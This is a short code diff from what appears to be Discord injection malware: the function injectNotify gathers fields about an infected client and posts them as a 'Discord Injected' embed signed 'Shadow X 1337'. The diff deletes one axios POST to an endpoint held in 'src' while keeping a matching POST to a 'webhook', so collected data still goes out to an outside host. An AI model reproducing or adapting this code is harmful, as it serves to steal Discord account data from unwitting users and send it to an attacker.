@@ -164,28 +164,6 @@ function injectNotify() {
         }
         fields.push(c)
     })
-    axios
-	.post(src, {
-        "content": null,
-        "embeds": [
-          {
-            "title": "Discord Injected",
-            "color": config["embed-color"],
-            "fields": fields,
-            "author": {
-              "name": "Shadow X 1337"
-            },
-            "footer": {
-              "text": "Shadow X 1337"
-            }
-          }
-        ]
-      })
-	.then(res => {
-	})
-	.catch(error => {
-
-    })
 
     axios
 	.post(webhook, {
